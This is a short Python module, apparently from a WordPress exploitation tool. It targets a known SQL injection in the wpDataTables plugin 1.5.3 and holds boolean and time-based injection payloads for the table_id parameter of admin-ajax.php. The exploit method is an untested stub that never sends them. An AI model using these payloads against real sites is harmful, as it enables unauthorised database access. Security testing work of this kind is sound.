from ..exploitsql import ExploitSql


class WPDataTablesSQL(ExploitSql):
    exploit_info = {
        'exploit_name': 'wpDataTables',
        'exploit_version': '1.5.3',
        'exploit_url': 'http://www.exploit-db.com/exploits/35340/'
    }

    def exploit(self):
        # TODO Get plugin to test on local server
        exploit = {
            1: '/wp-admin/admin-ajax.php?action=get_wdtable&table_id=1 AND 9029=9029',
            2: '/wp-admin/admin-ajax.php?action=get_wdtable&table_id=1 AND SLEEP(5)'
        }
        self.exploitnotfound(self.exploit_info)
